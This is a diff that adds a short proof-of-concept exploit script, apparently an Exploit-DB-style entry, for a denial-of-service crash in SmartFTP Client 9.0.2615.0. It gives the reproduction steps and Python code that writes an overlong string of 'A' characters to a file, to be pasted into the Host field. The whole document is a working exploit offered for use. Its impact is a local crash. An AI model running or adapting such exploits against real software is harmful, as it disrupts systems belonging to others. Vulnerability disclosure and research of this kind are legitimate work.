@@ -1,0 +1,21 @@
+#Exploit Title: SmartFTP Client 9.0.2615.0 - Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2018-10-30
+#Vendor Homepage: https://www.smartftp.com/en-us/
+#Software Link: https://www.smartftp.com/en-us/download
+#Tested Version: 9.0.2615.0
+#Tested on: Windows 10 Single Language x64
+
+#Steps to produce the crash:
+#1.- Run python code: SmartFTP_9.0.2615.0_Denial_of_Service_(PoC).py
+#2.- Open network.txt and copy content to clipboard
+#2.- Open SmartFTP Client
+#3.- Select Connection
+#4.- Paste ClipBoard on "Host" 
+#5.- Crashed
+
+cod = "\x41" * 300
+
+f = open('network.txt', 'w')
+f.write(cod)
+f.close()
